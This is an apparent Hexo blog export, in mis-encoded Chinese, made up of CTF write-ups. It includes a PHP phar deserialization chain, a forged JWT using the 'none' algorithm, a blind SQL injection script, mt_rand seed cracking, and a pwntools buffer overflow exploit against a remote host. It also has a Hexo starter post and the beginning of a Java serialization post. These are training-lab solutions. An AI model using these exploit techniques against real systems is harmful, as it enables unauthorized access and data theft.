download é¡µé¢è®¾ç½® 1ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;); æ‰€ä»¥æˆ‘ä»¬æ˜¯è¯»ä¸åˆ°é™¤äº†å½“å‰é¡µé¢ã€&#x2F;etcã€&#x2F;tmp è¿™ä¸‰ä¸ªç›®å½•ï¼Œè¿™é‡Œå°±ä¸ä¼šå†™äº†ï¼Œç›´æ¥çœ‹é¢˜è§£å§ã€‚ é¢˜è§£è¯´å¯ä»¥ä» delete.php å…¥æ‰‹ 1if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) æˆ‘ä»¬è·Ÿè¿› open å‡½æ•°ï¼Œåœ¨ class.php çš„ File ç±»é‡Œ 12345678public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125;&#125; ç„¶å file_exists ä¼šè§¦å‘ phar ååºåˆ—åŒ– æ­£å¥½ User ç±»æœ‰ä¸€ä¸ª 123public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125; è€Œ File ç±»é‡Œ close æ–¹æ³•æ°å¥½å¯ä»¥æ–‡ä»¶åŒ…å« 123public function close() &#123; return file_get_contents($this-&gt;filename);&#125; è¿™æ ·å°±é¿å…ä» download é¡µé¢è§¦å‘ closeï¼Œè½¬è€Œç”± delete api è§¦å‘ï¼Œå¯æ˜¯æ²¡æœ‰è¾“å‡ºï¼Œæ‰€ä»¥è¿˜å¾—æ‰¾é“¾å­ã€‚ æ³¨æ„åˆ° FileList ç±» çš„ __destruct è¾“å‡ºäº†ä»€ä¹ˆï¼Œå…ˆçœ‹æ„é€ å‡½æ•°ã€‚åˆ›å»ºäº†ä¸€ä¸ª results äºŒç»´æ•°ç»„ï¼Œä¸€ç»´æ˜¯ $file-&gt;name()ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åï¼ŒäºŒç»´åœ¨ __call é‡Œå®ç° ï¼Œæ˜¯ $file-&gt;$func(),è€Œ $func æ­£å¥½å°±æ˜¯ call ä¼ æ¥çš„å‚æ•°ã€‚ é‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å°±èƒ½æ„é€ è¿™æ ·ä¸€æ¡é“¾ 1User::__destruct -&gt; FileList::close -&gt; FileList::call -&gt; File::close -&gt; FileList::__destruct ç„¶åè¾“å‡ºã€‚ æ„é€  phar 123456789101112131415161718192021222324252627&lt;?phpunlink(&#x27;phar.phar&#x27;);class User &#123; public $db;&#125;class FileList &#123; private $files; public function __construct() &#123; $this-&gt;files = array(new File()); &#125;&#125;class File &#123; public $filename=&quot;/flag.txt&quot;;&#125;$a = new User();$b = new FileList();$a -&gt; db = $b;$phar = new Phar(&#x27;phar.phar&#x27;);$phar-&gt;startBuffering();$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;);$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&#x27;1.txt&#x27;,&#x27;xxx&#x27;);$phar-&gt;stopBuffering();?&gt; ç„¶åä¸Šä¼ ï¼Œæ”¹åæˆç«‹ phar.jpg åï¼Œåœ¨åˆ é™¤ä½ç½®æŠ“åŒ…ï¼Œæ”¹åä¸º 1filename=phar://phar.jpg å¾—åˆ° flagã€‚ [b01lers2020]Welcome to Earthä¸€å¼€å§‹æ²¡ä»€ä¹ˆæŠ€æœ¯æ°´å¹³ï¼Œä¸æ–­ ctrl + u æŸ¥çœ‹æºç ï¼Œç„¶åæ‰¾è·¯ç”±ï¼Œæ‰¾ jsã€‚æœ€ååœ¨ &#x2F;fight&#x2F; æ‰¾åˆ° &#x2F;static&#x2F;js&#x2F;fight.js 123456789101112131415161718// Run to scramble original flag//console.log(scramble(flag, action));function scramble(flag, key) &#123; for (var i = 0; i &lt; key.length; i++) &#123; let n = key.charCodeAt(i) % flag.length; let temp = flag[i]; flag[i] = flag[n]; flag[n] = temp; &#125; return flag;&#125;function check_action() &#123; var action = document.getElementById(&quot;action&quot;).value; var flag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]; // TODO: unscramble function&#125; ç”±äºä¸çŸ¥é“ key å€¼ï¼Œåªèƒ½çˆ†ç ´äº†ã€‚å·²çŸ¥ å¼€å¤´ pctf&#123; ç»“å°¾ &#125; 123456789101112from itertools import permutationsimport reflag = [&quot;&#123;hey&quot;, &quot;_boy&quot;, &quot;aaaa&quot;, &quot;s_im&quot;, &quot;ck!&#125;&quot;, &quot;_baa&quot;, &quot;aaaa&quot;, &quot;pctf&quot;]# å¯¹flagå­—å…¸é‡Œçš„å†…å®¹è¿›è¡Œæ’åˆ—ç»„åˆitem = permutations(flag)# éå†for a in item: k = &#x27;&#x27;.join(list(a)) # åŒ¹é… if re.search(&#x27;^pctf\\&#123;hey[a-zA-z_]+ck!\\&#125;$&#x27;, k): print(k) 1pctf&#123;hey_boys_im_baaaaaaaaaack!&#125; [HFCTF2020]EasyLoginæ³¨å†Œå®Œå†ç™»å½•å‘ç°æœ‰ä¸€ä¸ª &#x2F;api&#x2F;flag æ¥å£ï¼Œç‚¹å‡»åå‘ç°æƒé™ä¸å¤Ÿï¼Œåº”è¯¥åˆè¦ä» cookie å…¥æ‰‹äº†ã€‚æŠ“åŒ…çœ‹åˆ° cookie å­—æ®µ 1sses:aok=eyJ1c2VybmFtZSI6bnVsbCwiX2V4cGlyZSI6MTcyMTEzMjQ0MTg5MywiX21heEFnZSI6ODY0MDAwMDB9; sses:aok.sig=SvXloEwmT-Q-Lyfpral8kVxv9kQ æ‹¿å» base64 è§£ç å†æ”¹æˆ admin ç„¶åå‘åŒ…ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œé‚£åªèƒ½ä»å¤´å¼€å§‹çœ‹äº† æ¥åˆ°ç™»é™†æ³¨å†Œé¡µé¢ï¼Œæ‰“å¼€ &#x2F;static&#x2F;js&#x2F;app.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * æˆ–è®¸è¯¥ç”¨ koa-static æ¥å¤„ç†é™æ€æ–‡ä»¶ * è·¯å¾„è¯¥æ€ä¹ˆé…ç½®ï¼Ÿä¸ç®¡äº†å…ˆå¡«ä¸ªæ ¹ç›®å½•XD */function login() &#123; const username = $(&quot;#username&quot;).val(); const password = $(&quot;#password&quot;).val(); const token = sessionStorage.getItem(&quot;token&quot;); $.post(&quot;/api/login&quot;, &#123;username, password, authorization:token&#125;) .done(function(data) &#123; const &#123;status&#125; = data; if(status) &#123; document.location = &quot;/home&quot;; &#125; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;);&#125;function register() &#123; const username = $(&quot;#username&quot;).val(); const password = $(&quot;#password&quot;).val(); $.post(&quot;/api/register&quot;, &#123;username, password&#125;) .done(function(data) &#123; const &#123; token &#125; = data; sessionStorage.setItem(&#x27;token&#x27;, token); document.location = &quot;/login&quot;; &#125;) .fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;);&#125;function logout() &#123; $.get(&#x27;/api/logout&#x27;).done(function(data) &#123; const &#123;status&#125; = data; if(status) &#123; document.location = &#x27;/login&#x27;; &#125; &#125;);&#125;function getflag() &#123; $.get(&#x27;/api/flag&#x27;).done(function(data) &#123; const &#123;flag&#125; = data; $(&quot;#username&quot;).val(flag); &#125;).fail(function(xhr, textStatus, errorThrown) &#123; alert(xhr.responseJSON.message); &#125;);&#125; å¯ä»¥çœ‹åˆ° koaï¼Œè¯´æ˜æ˜¯ nodejs çš„ koa æ¡†æ¶ã€‚ æ³¨å†Œå®Œå†ç™»å½•æŠ“åŒ… 1username=123&amp;password=123&amp;authorization=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTcyMTA1MjIyNH0.ZLJcJ-eBcqhEgTS-gRJjNqRrVAhWZzefQk4JWtmMpwc åˆ°è¿™é‡Œå¯ä»¥å¯ä»¥çŒœæ˜¯ JWT äº†ï¼Œå› ä¸ºæ˜¯ node çš„åå°ï¼Œæ‰€ä»¥ä¸å¤§å¯èƒ½æ˜¯ flask sessionï¼Œä¸è¿‡ä¹Ÿå¯ä»¥é€šè¿‡ä»£ç å¾—çŸ¥ã€‚æˆ‘ä»¬åœ¨ä¸Šä¸€æ­¥å¾—åˆ°äº† koa æ¡†æ¶ å¯ä»¥çœ‹åˆ°å­˜æ”¾è·¯ç”±åœ¨ controllers æ–‡ä»¶å¤¹ä¸‹ï¼Œè€Œä¸” &#x2F;static&#x2F;js&#x2F;app.js é‡Œçš„è·¯ç”±ä» &#x2F;api&#x2F; å¼€å§‹çš„ã€‚é‚£ä¹ˆè¯´æ˜æ§åˆ¶å™¨ä¸‹æœ‰ä¸€ä¸ª api.jsï¼Œè®¿é—® &#x2F;controllers&#x2F;api.js ï¼ˆkoa çš„è·¯ç”±è§„åˆ™ï¼‰ï¼Œå°±èƒ½å¾—åˆ°æºç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586const crypto = require(&#x27;crypto&#x27;);const fs = require(&#x27;fs&#x27;)const jwt = require(&#x27;jsonwebtoken&#x27;)const APIError = require(&#x27;../rest&#x27;).APIError;module.exports = &#123; &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || username === &#x27;admin&#x27;)&#123; throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;); &#125; if(global.secrets.length &gt; 100000) &#123; global.secrets = []; &#125; const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;); const secretid = global.secrets.length; global.secrets.push(secret) const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;); ctx.rest(&#123; token: token &#125;); await next(); &#125;, &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123; const &#123;username, password&#125; = ctx.request.body; if(!username || !password) &#123; throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;); &#125; const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization; const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid; console.log(sid) if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;); &#125; const secret = global.secrets[sid]; const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;); const status = username === user.username &amp;&amp; password === user.password; if(status) &#123; ctx.session.username = username; &#125; ctx.rest(&#123; status &#125;); await next(); &#125;, &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123; if(ctx.session.username !== &#x27;admin&#x27;)&#123; throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;); &#125; const flag = fs.readFileSync(&#x27;/flag&#x27;).toString(); ctx.rest(&#123; flag &#125;); await next(); &#125;, &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123; ctx.session.username = null; ctx.rest(&#123; status: true &#125;) await next(); &#125;&#125;; 1const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;); å¯ä»¥çœ‹åˆ°ç¡®å®æ˜¯ jwtã€‚ æˆ‘ä»¬æŠŠæœ€å¼€å§‹çš„ authorization&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTcyMTA1MjIyNH0.ZLJcJ-eBcqhEgTS-gRJjNqRrVAhWZzefQk4JWtmMpwc æ‹¿å»è§£ç  è€Œä¸”æˆ‘ä»¬éƒ½çŸ¥é“åªè¦å‰ç«¯ jwt ä¼ é€’çš„ç®—æ³•æ˜¯ none ï¼Œé‚£ä¹ˆåç«¯ jwt è§£ææ—¶å°±ä¸ä¼šæŒ‰ç…§åŸæœ‰ç®—æ³•è¿›è¡Œè§£æï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æŠŠ alg å­—æ®µè®¾ç½®ä¸º none æ¥è¿›è¡Œç»•è¿‡ ä½†æ˜¯è¿™æ ·ä¸è¡Œ 123if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;); &#125; ä¸èƒ½è¿›è¿™ä¸ª if é‡Œé¢ï¼Œä¸ç„¶ç¨‹åºç›´æ¥å°±ç»“æŸäº†ã€‚è¿™ä¸ª sid å°±æ˜¯ secretid å­—æ®µï¼Œglobals.secrets ä¹Ÿæ˜¯ï¼Œæˆ‘ä»¬æ”¹æˆæŠŠ secretid æ”¹æˆæ•°ç»„å°±è¡Œäº†,js å¼±ç±»å‹ï¼Œç©ºæ•°ç»„ &lt; 1 &amp;&amp; ç©ºæ•°ç»„ &#x3D;&#x3D; 0ã€‚ç„¶å username å­—æ®µæ”¹æˆ admin 123456789101112import jwttoken = jwt.encode( &#123; &quot;secretid&quot;: [], &quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;123456&quot;, &quot;iat&quot;: 1721052224 &#125;, algorithm=&quot;none&quot;, key=&quot;&quot;).encode(encoding=&#x27;utf-8&#x27;)print(token) 1eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTcyMTA1MjIyNH0. å¾—åˆ°åç™»é™†æ—¶å¡«å…¥å†å‘åŒ… 1username=admin&amp;password=123456&amp;authorization=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTcyMTA1MjIyNH0. è¿”å›åŒ…å¾—åˆ° 12Set-Cookie: sses:aok=eyJ1c2VybmFtZSI6ImFkbWluIiwiX2V4cGlyZSI6MTcyMTEzODY4ODI3MiwiX21heEFnZSI6ODY0MDAwMDB9; path=/; expires=Tue, 16 Jul 2024 14:04:48 GMT; httponlySet-Cookie: sses:aok.sig=Ylj_bYj_RHpp3OgQU_RN9mfEA60; path=/; expires=Tue, 16 Jul 2024 14:04:48 GMT; httponlyzaba æ•´ç†ä¸€ä¸‹ï¼Œä¿ç•™æˆ‘ä»¬è¦çš„ cookie 12sses:aok=eyJ1c2VybmFtZSI6ImFkbWluIiwiX2V4cGlyZSI6MTcyMTEzODY4ODI3MiwiX21heEFnZSI6ODY0MDAwMDB9sses:aok.sig=Ylj_bYj_RHpp3OgQU_RN9mfEA60 ç„¶åè®¿é—® &#x2F;api&#x2F;flag æŠ“åŒ… æ›¿æ¢ä¸Šè¿° cookie å­—æ®µï¼Œç„¶åå‘åŒ…å¾—åˆ° flag [CISCN2019 æ€»å†³èµ› Day2 Web1]Easywebæ‰“å¼€ç™»å½•é¡µé¢ï¼Œæ²¡çœ‹å‡ºä»€ä¹ˆï¼Œç›´æ¥æ‰«å¾—åˆ° robots.txt 12User-agent: *Disallow: *.php.bak å¯ä»¥ä¸‹è½½å¤‡ä»½æ–‡ä»¶ï¼Œä¸»é¡µç™»é™†æŠ“åŒ…çœ‹åˆ°æœ‰ä¸ª image.php,ä¸‹è½½æ¥çœ‹çœ‹ 123456789101112131415161718&lt;ï»¿?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯å¯ä»¥ sql æ³¨å…¥çš„ï¼Œæˆ‘ä»¬è®© id&#x3D;\\0 è¿™æ ·å°±èƒ½åªå‰©ä¸‹ä¸€ä¸ª ,æŠŠ $id åé¢é‚£ä¸ªå•å¼•å·æ³¨é‡Šæ‰äº†ï¼Œå’Œ $path å‰é¢é‚£ä¸ªå•å¼•å·æ„é€ é—­åˆï¼Œç„¶åå°±èƒ½æ³¨å…¥äº†ï¼Œä½†æ˜¯ image.php åªä¼šè¿”å›å›¾ç‰‡æˆ–è€…å•¥ä¹Ÿæ²¡æœ‰ï¼Œæ‰€ä»¥åªèƒ½ç›²æ³¨äº† 12345678910111213141516171819202122232425262728293031323334import requestsurl = &quot;http://5e672981-2f2f-4ad4-9e40-2ef1a55c0b1f.node5.buuoj.cn:81/image.php?id=\\\\0&amp;path= or &quot;result = &quot;&quot;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # æŸ¥æ•°æ®åº“ ciscnfinal # payload = &quot;select database()&quot; # æŸ¥è¡¨ images,users # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=0x636973636e66696e616c&quot; # æŸ¥å­—æ®µ username,password # payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;0x7573657273&#x27;&quot; # æŸ¥flag admin payload = &quot;select group_concat(password) from users&quot; strs = f&quot;if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) %23&quot; r = requests.get(url+strs) if &quot;JFIF&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) å¾—åˆ°è´¦å·å¯†ç åç™»å½•ï¼Œå‘ç°æœ‰æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆä¸Šä¼ ä¸€å¼ å›¾ï¼Œè¿”å›ä¸€æ¡è·¯å¾„ï¼Œè®¿é—®å‘ç°æ˜¯ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶.php,è®°å½•äº†æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åã€‚ æ—¢ç„¶è¿™ä¸ªæ–‡ä»¶æ˜¯ php äº†ï¼Œé‚£ä¹ˆç›´æ¥åœ¨æ–‡ä»¶åå¤„å†™å†™ğŸï¼Œç„¶åè®¿é—®æ—¥å¿—æ–‡ä»¶å³å¯æ‹¿åˆ° shell","tags":["ctf","åˆ·é¢˜","buu","sql","æŠ¥é”™æ³¨å…¥","äºŒæ¬¡æ³¨å…¥","xxe","å†…ç½‘","ssrf","php ç‰¹æ€§","python","æ–‡ä»¶åŒ…å«","æ–‡ä»¶ä¸Šä¼ ","phar ååºåˆ—åŒ–","jwt ä¼ªé€ ","koa"],"categories":["CTF"]},{"title":"æŸåœºCTFè§£é¢˜è®°å½•","path":"/2024/07/17/ctf/GYBCTF/","content":"å¾ˆå¯æƒœæœ‰ä¸€é“é€†å‘å°±å·®ä¸€ç‚¹è§£å‡ºæ¥ Webweb1è®¿é—®robots.txt ç„¶åè®¿é—® &#x2F;robot-nurses å†ä¸‹æ‹‰åˆ°æœ€åä¸€è¡Œ web4è®¿é—® robots.txt 1234567891011121314151617181920212223242526&lt;?php include &#x27;flag.php&#x27;; session_start(); $_SESSION[&#x27;seed&#x27;]=&#x27;xxxxxxxxxxxxxxxxx&#x27;; function createToken()&#123; mt_srand($_SESSION[&#x27;seed&#x27;]); $dic = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $token = &#x27;&#x27;; for ( $i = 0; $i &lt;20; $i++ )&#123; $token .= substr($dic,mt_rand(0, strlen($dic) - 1), 1); &#125; $_SESSION[&#x27;token&#x27;]=$token; $top10=substr($token,0,10); echo &#x27;&lt;p class=&quot;p1&quot;&gt;Generate token successfully&lt;/p&gt;&lt;p class=&quot;p2&quot;&gt;é»æ„®ãšé”›æ°­åé¨å‹ªæŠ¤é—å±½å¢ 10æµ£å¶„è´Ÿé”›ï¿½&#x27;.$top10.&#x27;&lt;/p&gt;&#x27;; &#125; createToken(); if(isset($_POST[&#x27;token&#x27;]))&#123; if($_POST[&#x27;token&#x27;]==$_SESSION[&#x27;token&#x27;])&#123; echo &#x27;&lt;p class=&quot;p2&quot;&gt;æµ ã‚‡å¢æ¥ å²ƒç˜‰é´æ„¬å§›é”›å²ƒç¹–é„îˆ™ç¶˜é¯å® î›¦é¨å‹¶ç´°&#x27;.$flag.&#x27;&lt;/p&gt;&#x27;; &#125;else&#123; echo &#x27;&lt;p class=&quot;p2&quot;&gt;æµ ã‚‡å¢æ¥ å²ƒç˜‰æ¾¶è¾«è§¦&lt;/p&gt;&#x27;; &#125; &#125; ?&gt; ä¸€çœ¼ GWCTF 2019 WEB-æ¯ç‡¥çš„æŠ½å¥–ï¼Œæœä¸€ä¸‹é¢˜è§£ [GWCTF 2019 WEB-æ¯ç‡¥çš„æŠ½å¥–_gwctf 2019]æ¯ç‡¥çš„æŠ½å¥– 1-CSDNåšå®¢ å…ˆå¾—å‡ºéšæœºå€¼ 12345678910str1=&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;str2=&#x27;R9WLuE5hGV&#x27;length = len(str2)res=&#x27;&#x27;for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+&#x27; &#x27;+str(j)+&#x27; &#x27;+&#x27;0&#x27;+&#x27; &#x27;+str(len(str1)-1)+&#x27; &#x27; breakprint(res) å¾—åˆ°ç§å­ POCï¼š 1234567891011&lt;?php$seed = 2107153532;mt_srand($seed);$dic = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$token = &#x27;&#x27;;for ( $i = 0; $i &lt;20; $i++ )&#123; $token .= substr($dic,mt_rand(0, strlen($dic) - 1), 1);&#125;echo $token;?&gt; å¾—åˆ° token å¡«å…¥å¾—åˆ° flag Cryptocrypto1png æç¤ºä¸º hill åŠ å¯†ï¼Œ010 æ‰“å¼€ png å¾—åˆ°å¯†æ–‡ CLYCOEXMAYHDã€‚ç„¶å hill è§£å¯† Pwnpwn1åœ¨ vul å‡½æ•°å¤„å‘ç°æ ˆæº¢å‡ºç‚¹ å­˜åœ¨åé—¨å‡½æ•° get_shell POC: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *from LibcSearcher import *def s(a): io.send(a)def sa(a, b): io.sendafter(a, b)def sl(a): io.sendline(a)def sla(a, b): io.sendlineafter(a, b)def r(): return io.recv()def pr(): print(io.recv())def rl(a): return io.recvuntil(a)def inter(): io.interactive()def debug(): gdb.attach(io) pause()def get_64addr(): return u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def get_32addr(): return u32(io.recvuntil(b&#x27;\\xf7&#x27;)[-4:])def get_64sb(): return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))def get_32sb(): return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))def get_64sb_libcsearch(): return libc_base + libc.dump(&#x27;system&#x27;), libc_base + libc.dump(&#x27;str_bin_sh&#x27;)def get_32sb_libcsearch(): return libc_base + libc.dump(&#x27;system&#x27;), libc_base + libc.dump(&#x27;str_bin_sh&#x27;)# context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)# io = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)io = remote(&quot;111.74.9.131&quot;,10309)padding = 0x30 + 8sh = 0x4008D0payload = flat([padding*b&#x27;a&#x27;],sh)sl(payload)inter() ReRe2æŸ¥çœ‹ä¸»å‡½æ•°ï¼Œå‘ç°æœ‰ä¸¤ä¸ªé€»è¾‘å¤„ç† 1. è¾“å…¥çš„ flag å’Œ 0x7FF7B9AE3020 åœ°å€å¤„çš„è¿›è¡Œå¼‚æˆ– 2. v31 å¤„ä»¥ 0x7FF7B9AE30A0 å‡ºçš„å€¼ä½œä¸ºä¸‹æ ‡ï¼Œå¹¶æŠŠ flag çš„å€¼èµ‹äºˆç»™å®ƒ ç„¶åè¦æ±‚æ‰€å¾—å€¼ä¸º â€œ23gJba3au9mnk3c10:0zp8qJr41H39jpâ€,ç¼–å†™ POC 1234567891011121314151617en = [0x00000053, 0x00000045, 0x0000005C, 0x0000001E, 0x00000050, 0x00000013,0x0000002F, 0x00000078, 0x00000004, 0x00000053, 0x00000058,0x0000004A, 0x00000043, 0x00000001, 0x00000041, 0x0000002A,0x00000008, 0x00000040, 0x00000067, 0x0000002F, 0x0000000C, 0x0000004A, 0x00000012, 0x0000002E,0x00000041, 0x0000006C, 0x00000005, 0x00000054, 0x00000040, 0x00000012, 0x0000005B, 0x0000004F]print(len(en))v = [0x00000004, 0x0000000F, 0x0000000B, 0x0000001E, 0x0000000E, 0x00000014, 0x0000001F, 0x00000009, 0x00000017, 0x00000002, 0x00000019, 0x0000001C, 0x00000012, 0x00000010, 0x00000000, 0x00000008, 0x00000011, 0x00000001, 0x00000015, 0x00000003, 0x0000000A, 0x0000001D, 0x0000000C, 0x00000016, 0x00000018, 0x0000000D, 0x0000001B, 0x00000005, 0x00000007, 0x00000006, 0x00000013, 0x0000001A]print(len(v))strs = &quot;23gJba3au9mnk3c10:0zp8qJr41H39jp&quot;strs = [ord(i) for i in strs]flag = []for i in v: flag.append(strs[i])for i in range(len(flag)): print(chr(flag[i]^en[i]),end=&quot;&quot;) å¾—åˆ° flag","tags":["ctf","åˆ·é¢˜","æ¯”èµ›"],"categories":["CTF"]},{"title":"Quick Start","path":"/2024/07/17/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment"},{"title":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–","path":"/2024/07/12/java/å¼€å‘/åºåˆ—åŒ–ä¸ååºåˆ—åŒ–/","content":"å¼€å¯ java å®‰å…¨å­¦ä¹ ç¬¬äºŒç«™ï¼Œjava åºåˆ—åŒ–ä¸ååºåˆ—åŒ– 0x01 æ„ä¹‰æˆ‘ä»¬éƒ½çŸ¥é“å°±ç®—æ˜¯ä¸€æ¡å†…è£¤éƒ½æœ‰å®ƒçš„ä½œç”¨å’Œæ„ä¹‰ï¼Œé‚£ä¹ˆåºåˆ—åŒ–å’Œååºåˆ—åŒ–å­˜åœ¨çš„æ„ä¹‰åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸œè¥¿æ¥å¹²ä»€ä¹ˆï¼Ÿ å®ç°ä¸¤ä¸ªè¿›ç¨‹é—´å¯¹è±¡çš„ä¼ è¾“ è¿™ä¸ªå°±æ˜¯ java åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å®šä¹‰äº†ï¼Œå‰è€…å°†å¯¹è±¡è½¬åŒ–ä¸ºå­—èŠ‚æµæ•°æ®ï¼Œåè€…å°†å­—èŠ‚æµæ•°æ®è¿˜åŸä¸ºå¯¹è±¡ å®ç°æ•°æ®çš„æŒä¹…åŒ– å¯¹è±¡åºåˆ—åŒ–ä¹‹åå¯ä»¥æŠŠå­—èŠ‚æ•°æ®å†™å…¥æ–‡ä»¶ä¸­ï¼ˆç¡¬ç›˜é‡Œï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥å‡è½»å†…å­˜çš„è´Ÿæ‹…ï¼Œå†ç”¨çš„æ—¶å€™ååºåˆ—åŒ–è¿˜åŸå³å¯ã€‚æ¯”å¦‚é…ç½®ä¿¡æ¯ï¼Œç”¨æˆ·çš„æ•°æ®ç­‰ç­‰ã€‚ è§„èŒƒä¼ é€’æ ¼å¼ï¼Œæ–¹ä¾¿ç½‘ç»œä¼ è¾“ è¿™ä¸ªä¹Ÿå¾ˆå¥½ç†è§£ï¼Œæ–‡æœ¬éŸ³é¢‘è§†é¢‘è¿™äº›æ•°æ®å…¨è¢«åºåˆ—åŒ–ä¸ºäºŒè¿›åˆ¶æ•°æ®äº†ï¼Œå½“ç„¶å¾ˆå¥½ä¼ è¾“ã€‚ 0x02 åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å®ç°åºåˆ—åŒ–çš„å®ç° å®ç° Serializable æ¥å£ï¼šå°†è¦åºåˆ—åŒ–çš„ç±»å®ç° Serializable æ¥å£ã€‚ 